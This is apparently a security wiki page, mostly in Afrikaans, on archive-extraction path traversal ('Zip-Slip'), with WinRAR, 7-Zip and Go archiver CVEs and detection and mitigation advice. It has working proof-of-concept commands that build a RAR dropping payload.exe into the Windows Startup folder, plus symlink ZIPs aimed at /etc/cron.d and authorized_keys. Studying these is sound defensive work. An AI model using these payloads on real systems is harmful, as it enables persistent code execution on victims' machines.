# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Oorsig

Baie argiefformate (ZIP, RAR, TAR, 7-ZIP, ens.) laat elke inskrywing sy eie **internal path** dra. Wanneer 'n uitpaknutsprogram daardie pad blindelings eerbiedig, sal 'n vervaardigde lêernaam wat `..` of 'n **absolute path** (bv. `C:\Windows\System32\`) bevat, buite die deur die gebruiker gekose gids geskryf word.
Hierdie klas kwesbaarheid is algemeen bekend as *Zip-Slip* of **archive extraction path traversal**.

Gevolge wissel van die oor-skrywing van arbitrêre lêers tot die direkte bereik van **remote code execution (RCE)** deur 'n payload in 'n **auto-run** ligging soos die Windows *Startup* gids te laat val.

## Oorsaak

1. Aanvaller skep 'n argief waar een of meer lêerkoppe die volgende bevat:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Slagoffer pak die argief uit met 'n kwesbare hulpmiddel wat die ingebedde pad vertrou (of symlinks volg) in plaas daarvan om dit te sanitiseer of om uitpakking onder die gekose gids af te dwing.
3. Die lêer word in die aanvaller-beheerde ligging geskryf en uitgevoer/gelaai die volgende keer as die stelsel of gebruiker daardie pad aktiveer.

### .NET `Path.Combine` + `ZipArchive` traversal

'n Algemene .NET anti-patroon is om die beoogde bestemming te kombineer met **deur gebruiker beheer** `ZipArchiveEntry.FullName` en uit te pak sonder padnormalisering:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- As `entry.FullName` met `..\\` begin, traverseer dit; as dit 'n **absolute path** is, word die linker komponent heeltemal weggelaat, wat 'n **arbitrary file write** as die ekstraksie-identiteit lewer.
- Proof-of-concept-argief om in 'n sibling `app` directory te skryf wat deur 'n geplande skandeerder dopgehou word:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Deur daardie ZIP in die gemonitorde inkassie te los, word `C:\samples\app\0xdf.txt` geskep, wat traversering buite `C:\samples\queue\` bewys en opvolg-primitiewe moontlik maak (bv., DLL hijacks).

## Werklike voorbeeld – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR vir Windows (insluitend die `rar` / `unrar` CLI, die DLL en die draagbare bronkode) het nie lêernaamvalidasie tydens die uitpak uitgevoer nie.
'n kwaadaardige RAR-argief wat 'n inskrywing soos:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
sal uiteindelik **buite** die geselekteerde uitvoergids en binne die gebruiker se *Startup*-gids beland. Na aanmelding voer Windows outomaties alles wat daar teenwoordig is uit, wat *permanente* RCE verskaf.

### Skep van 'n PoC-argief (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – stoor lêerpaadjies presies soos gegee (moet **nie** die voorvoeging `./` afkap nie).

Lewer `evil.rar` aan die slagoffer en instrueer hulle om dit met 'n kwesbare WinRAR build uit te pak.

### Waargenome uitbuiting in die wild

ESET het RomCom (Storm-0978/UNC2596) spear-phishing veldtogte gerapporteer wat RAR-argiewe aangeheg het wat CVE-2025-8088 misbruik om customised backdoors te deponeer en ransomware-operasies te fasiliteer.

## Nuwe gevalle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. Gebruikersinteraksie is net *opening/extracting* die argief.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Oorskryf `Start Menu/Programs/Startup` of diens-run liggings → code word by volgende aanmelding of diensherlaai uitgevoer.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Op 'n gepatchte build sal `/etc/cron.d` nie aangeraak word nie; die symlink word as 'n skakel binne /tmp/target uitgepak.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` volg `../` en gesimlinkte ZIP entries, wat buite `outputDir` skryf.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (projek nou gedepryseer).
* **Fix**: Skakel oor na `mholt/archives` ≥ 0.1.0 of implementeer canonical-path kontrole voor skryf.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Opsporingswenke

* **Static inspection** – Lys argiefentries en merk enige naam wat `../`, `..\\`, *absolute paths* (`/`, `C:`) bevat of entries van tipe *symlink* wie se target buite die uitpakgids val.
* **Canonicalisation** – Maak seker `realpath(join(dest, name))` begin steeds met `dest`. Verwerp andersins.
* **Sandbox extraction** – Dekomprimeer in 'n weggooigids met 'n *safe* extractor (bv. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) en verifieer dat die onstaan­de paaie binne die gids bly.
* **Endpoint monitoring** – Waarsku oor nuwe uitvoerbare lêers wat kort ná die opening van 'n argief deur WinRAR/7-Zip/etc. in `Startup`/`Run`/`cron`-liggings geskryf word.

## Mitigasie & Verharding

1. **Update the extractor** – WinRAR 7.13+ en 7-Zip 25.00+ implementeer pad-/symlink-sanitization. Albei gereedskap het steeds geen outomatiese opdatering nie.
2. Pak argiewe uit met “**Do not extract paths**” / “**Ignore paths**” waar moontlik.
3. Op Unix: verlaag voorregte & moun 'n **chroot/namespace** voor uitpakking; op Windows gebruik **AppContainer** of 'n sandbox.
4. As jy eie kode skryf, normaliseer met `realpath()`/`PathCanonicalize()` **voor** create/write, en verwerp enige entry wat die bestemming verlaat.

## Bykomende aangetaste / Historiese gevalle

* 2018 – Groot *Zip-Slip* advisory deur Snyk wat baie Java/Go/JS biblioteke getref het.
* 2023 – 7-Zip CVE-2023-4011 soortgelyke traversal tydens `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Enige pasgemaakte uitpaklogika wat versuim om `PathCanonicalize` / `realpath` voor skryf aan te roep.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
